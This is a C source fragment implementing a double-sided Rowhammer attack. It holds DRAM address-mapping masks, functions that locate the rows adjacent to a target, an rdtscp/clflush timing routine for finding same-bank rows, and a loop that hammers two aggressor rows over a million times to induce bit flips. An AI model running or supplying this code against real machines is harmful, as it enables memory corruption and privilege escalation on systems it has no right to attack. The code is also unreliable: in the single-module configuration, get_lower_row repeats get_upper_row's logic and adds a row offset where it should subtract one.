#define COLUMN_END 14
#define BANK_END 16
#define COLUMN_MASK (((1) << (COLUMN_END)) - (1))
#define BANK_MASK (((1) << (BANK_END)) - (1) - COLUMN_MASK)
#define ROW_MASK ((~BANK_MASK) & (~COLUMN_MASK))
#define HAMMER_NUM 1200000
#define DIFF_NUM 100000

#ifndef ASSERT
#define ASSERT
#include <assert.h>
#endif

#define MEM_2M_2R_2C 1// 2module 4GB 2R 2C
#define MEM_1M_1R_1C 2 // 1module 4GB 1R 1C
#define MEM_SETTING MEM_1M_1R_1C

unsigned long get_upper_row(unsigned long ptr)
{	
	unsigned long bank,row,column,addr;

    switch(MEM_SETTING)
    {
        case MEM_2M_2R_2C:
        	addr = (ptr & 0xffffffffffe00000);
        	bank = ptr & 0x107000;
        	row = (((ptr & 0xf0000) >> 16) + 1) << 16;
        	column = ptr & 0x8fff;
            break;
        case MEM_1M_1R_1C:
            addr = 0;
            row = (ptr & (~((1<<13)-1))) + (1<<13);
            bank = ptr & (1<<12); 
            column = ptr & ((1<<12)-1);

            if ((row & (1<<18)) != (ptr & (1<<18)))
                row = row + (1<<18);

            if ((row & (1<<19)) != (ptr & (1<<19)))
                row = row + (1<<19);

            break;
        default:
            assert(0); 
    }

	return (bank | row | column | addr);


}

unsigned long get_lower_row(unsigned long ptr)
{
	unsigned long bank,row,column,addr;

    switch(MEM_SETTING)
    {
        case MEM_2M_2R_2C:
        	addr = (ptr & 0xffffffffffe00000);
        	bank = ptr & 0x107000;
        	row= (((ptr & 0xf0000) >> 16) - 1) << 16;
	        column = ptr & 0x8fff;
            break;
        case MEM_1M_1R_1C:
            addr = 0;
            row = (ptr & (~((1<<13)-1))) + (1<<13);
            bank = ptr & (1<<12); 
            column = ptr & ((1<<12)-1);

            if ((row & (1<<18)) != (ptr & (1<<18)))
                row = row + (1<<18);

            if ((row & (1<<19)) != (ptr & (1<<19)))
                row = row + (1<<19);

            break;
        default:
            assert(0); 
    }

	return (bank | row | column | addr);


}

unsigned long get_time_difference(void *_ptr1, void *_ptr2)
{
    unsigned long low, high, start_cycle, end_cycle;
    volatile int *ptr1 = _ptr1, *ptr2 = _ptr2;
    int i;

    __asm__ __volatile__(
            "mfence\n\t"
            "rdtscp\n\t"
            "mfence\n\t"
            : "=a" (low), "=d" (high)
            );
    start_cycle = ((low) | (high) << 32);

    for(i = 0; i < DIFF_NUM; i++)
    {
        __asm__ __volatile__(
                "mov (%0), %%rdx\n\t"
                "mov (%1), %%rdx\n\t"
                "clflush (%0)\n\t"
                "clflush (%1)\n\t"
                :
                : "r" (ptr1), "r" (ptr2)
                : "rdx"
                );
    }

    __asm__ __volatile__(
            "mfence\n\t"
            "rdtscp\n\t"
            "mfence\n\t"
            : "=a" (low), "=d" (high)
            );
    end_cycle = ((low) | (high) << 32);

    return end_cycle - start_cycle;
}

void double_sided_hammer(long *upper, long *lower)
{
    int i;

    for(i = 0; i < HAMMER_NUM; i++)
    {
        __asm__ __volatile__(
                "mov (%0), %%rdx\n\t"
                "mov (%1), %%rdx\n\t"
                "clflush (%0)\n\t"
                "clflush (%1)\n\t"
                :
                : "r" (upper), "r" (lower)
                : "rdx"
                );
    }
}

